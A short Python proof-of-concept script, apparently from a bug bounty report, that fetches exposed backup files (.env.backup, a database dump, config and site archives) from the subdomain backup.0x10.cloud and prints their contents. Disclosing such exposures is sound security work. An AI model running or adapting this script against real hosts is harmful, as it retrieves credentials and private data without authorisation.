"""
Author: Jamshaid Mirpour
Vulnerability: Open directory listing exposes backup files and sensitive credentials
Target subdomain: backup.0x10.cloud
"""

import urllib.request
import urllib.error
import time

# Verified finding target for backup exposure check
BASE = "http://backup.0x10.cloud"
FILES = [
    "/.env.backup",
    "/config_backup.tar.gz",
    "/db_backup.sql",
    "/site_backup.zip",
]

for path in FILES:
    url = BASE + path
    print("=" * 70)
    print(f"Fetching: {url}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as response:
            body = response.read(800)
            print(f"Status: {response.status}")
            print(f"Content-Type: {response.headers.get('Content-Type', '')}")
            print("Body preview:")
            print(body.decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as e:
        print(f"HTTP error: {e.code}")
    except Exception as e:
        print(f"Error: {e}")
    time.sleep(0.15)